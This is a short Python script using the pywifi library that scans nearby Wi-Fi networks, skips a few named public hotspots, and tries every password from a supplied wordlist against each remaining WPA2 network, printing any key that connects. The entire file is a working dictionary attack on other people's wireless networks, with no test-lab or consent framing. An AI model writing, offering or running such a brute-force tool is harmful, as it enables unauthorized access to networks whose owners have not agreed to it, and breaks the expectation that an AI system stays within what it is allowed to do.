from pywifi import *
import sys
import time

wifi = PyWiFi()

iface = wifi.interfaces()[0]

iface.disconnect()
time.sleep(1)

keys = open(sys.argv[1], "r").readlines()

iface.scan()
time.sleep(3)
scanRes = iface.scan_results()
for i, x  in enumerate(scanRes):
    if x.ssid in ['iTaiwan','iTaoyuan','CHT Wi-Fi Auto','CHT Wi-Fi(HiNet)']:
        print("%s: pass" % x.ssid)
    else:
        print("%s, %s, %s" % (x.ssid, x.bssid, x.signal))
        
        profile = Profile()
        profile.ssid = x.ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        
        for n,k in enumerate(keys):
            iface.remove_all_network_profiles()
            time.sleep(1)
            
            profile.key = k.strip()
            iface.connect(iface.add_network_profile(profile))
            if iface.status() == const.IFACE_CONNECTED:
                print("found PW: %s" % k)
                break
                
            iface.disconnect()